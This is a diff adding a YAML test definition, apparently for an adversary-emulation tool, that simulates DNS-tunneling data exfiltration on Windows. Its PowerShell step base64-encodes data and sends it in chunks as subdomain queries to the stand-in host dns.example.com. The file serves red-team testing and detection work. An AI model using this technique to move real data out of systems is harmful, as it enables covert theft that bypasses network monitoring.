@@ -1,0 +1,43 @@
+api_version: "2.0"
+name: Text Based Data Exfiltration using DNS subdomains
+description: |
+    Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.
+args:
+    - name: chunk_size
+      type: int
+      default: "63"
+    - name: dns_server
+      type: string
+      default: dns.example.com
+    - name: exfiltrated_data
+      type: string
+      default: SecretDataToExfiltrate
+uuid: c9207f3e-213d-4cc7-ad2a-7697a7237df9
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1041: Exfiltration Over C2 Channel'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: text-based-data-exfiltration-using-dns-subdomains
+      inline: |
+        $dnsServer = "{{.Args.dns_server}}"
+        $exfiltratedData = "{{.Args.exfiltrated_data}}"
+        $chunkSize = {{.Args.chunk_size}}
+
+        $encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
+        $encodedData = [Convert]::ToBase64String($encodedData)
+        $chunks = $encodedData -split "(.{$chunkSize})"
+
+        foreach ($chunk in $chunks) {
+            $dnsQuery = $chunk + "." + $dnsServer
+            Resolve-DnsName -Name $dnsQuery
+            Start-Sleep -Seconds 5
+        }
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
